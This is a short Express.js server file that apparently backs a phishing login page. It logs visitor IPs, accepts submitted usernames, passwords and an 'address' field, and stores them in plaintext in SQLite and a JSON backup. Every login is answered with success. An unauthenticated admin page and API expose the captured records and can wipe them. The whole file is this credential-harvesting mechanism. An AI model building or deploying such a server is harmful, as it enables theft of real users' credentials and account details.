const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const db = new sqlite3.Database('./login_records.db');

// Create table
db.run(`CREATE TABLE IF NOT EXISTS records (
    id INTEGER PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    timestamp TEXT
)`);

function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });

    // Save to SQLite
    db.run("INSERT INTO records (type, username, password, address, ip, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        [type, username, password, address, ip, timestamp], (err) => {
            if (err) console.error("SQLite Error:", err);
        });

    // Backup to JSON file
    const record = { type, username, password, address, ip, timestamp };
    fs.appendFile('backup_records.json', JSON.stringify(record) + '\n', (err) => {
        if (err) console.error("Backup Error:", err);
    });

    console.log(`✅ Saved: ${type} | User: ${username || '-'} | IP: ${ip}`);
}

// Routes
app.get('/', (req, res) => {
    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', (req, res) => {
    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', (req, res) => {
    const { username, password, address } = req.body;
    saveRecord('Login Attempt', username, password, address, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.json({ success: true });
});

app.get('/api/records', (req, res) => {
    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
        res.json(rows);
    });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', (req, res) => {
    db.run("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running with Backup`);
});